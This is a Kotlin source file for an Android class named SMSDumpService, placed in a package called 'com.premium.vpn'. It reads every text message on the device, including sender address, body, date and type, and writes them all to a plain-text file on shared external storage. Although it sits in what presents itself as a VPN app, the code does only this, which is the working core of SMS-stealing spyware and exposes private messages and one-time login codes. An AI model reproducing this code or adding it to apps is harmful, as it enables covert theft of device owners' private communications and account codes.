package com.premium.vpn

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.provider.Telephony
import android.util.Log
import androidx.core.app.ActivityCompat
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

class SMSDumpService {
    
    companion object {
        private const val TAG = "SMSDumpService"
        private const val SMS_DUMP_FILE = "sms_dump.txt"
    }
    
    fun dumpSMS(context: Context): Boolean {
        return try {
            // Check permissions
            if (!hasSMSPermissions(context)) {
                Log.e(TAG, "SMS permissions not granted")
                return false
            }
            
            // Get SMS data
            val smsData = readAllSMS(context)
            
            // Write to file
            writeSMSToFile(smsData)
            
            Log.i(TAG, "SMS dump completed successfully")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error dumping SMS: ${e.message}")
            false
        }
    }
    
    private fun hasSMSPermissions(context: Context): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun readAllSMS(context: Context): List<SMSData> {
        val smsList = mutableListOf<SMSData>()
        val contentResolver: ContentResolver = context.contentResolver
        
        val cursor: Cursor? = contentResolver.query(
            Uri.parse("content://sms/"),
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ
            ),
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        )
        
        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
            val readIndex = it.getColumnIndex(Telephony.Sms.READ)
            
            while (it.moveToNext()) {
                val sms = SMSData(
                    id = if (idIndex >= 0) it.getString(idIndex) else "",
                    address = if (addressIndex >= 0) it.getString(addressIndex) else "",
                    body = if (bodyIndex >= 0) it.getString(bodyIndex) else "",
                    date = if (dateIndex >= 0) it.getLong(dateIndex) else 0L,
                    type = if (typeIndex >= 0) it.getInt(typeIndex) else 0,
                    read = if (readIndex >= 0) it.getInt(readIndex) == 1 else false
                )
                smsList.add(sms)
            }
        }
        
        Log.i(TAG, "Read ${smsList.size} SMS messages")
        return smsList
    }
    
    private fun writeSMSToFile(smsList: List<SMSData>) {
        val sdcard = Environment.getExternalStorageDirectory()
        val file = File(sdcard, SMS_DUMP_FILE)
        
        FileWriter(file).use { writer ->
            writer.write("=== SMS DUMP - ${getCurrentDateTime()} ===\n\n")
            
            smsList.forEach { sms ->
                writer.write("ID: ${sms.id}\n")
                writer.write("Address: ${sms.address}\n")
                writer.write("Body: ${sms.body}\n")
                writer.write("Date: ${formatDate(sms.date)}\n")
                writer.write("Type: ${getSMSType(sms.type)}\n")
                writer.write("Read: ${sms.read}\n")
                writer.write("${"-".repeat(50)}\n\n")
            }
            
            writer.write("Total SMS Count: ${smsList.size}\n")
        }
        
        Log.i(TAG, "SMS data written to: ${file.absolutePath}")
    }
    
    private fun getCurrentDateTime(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date())
    }
    
    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }
    
    private fun getSMSType(type: Int): String {
        return when (type) {
            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Inbox"
            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "Outbox"
            Telephony.Sms.MESSAGE_TYPE_FAILED -> "Failed"
            Telephony.Sms.MESSAGE_TYPE_QUEUED -> "Queued"
            else -> "Unknown"
        }
    }
    
    data class SMSData(
        val id: String,
        val address: String,
        val body: String,
        val date: Long,
        val type: Int,
        val read: Boolean
    )
}


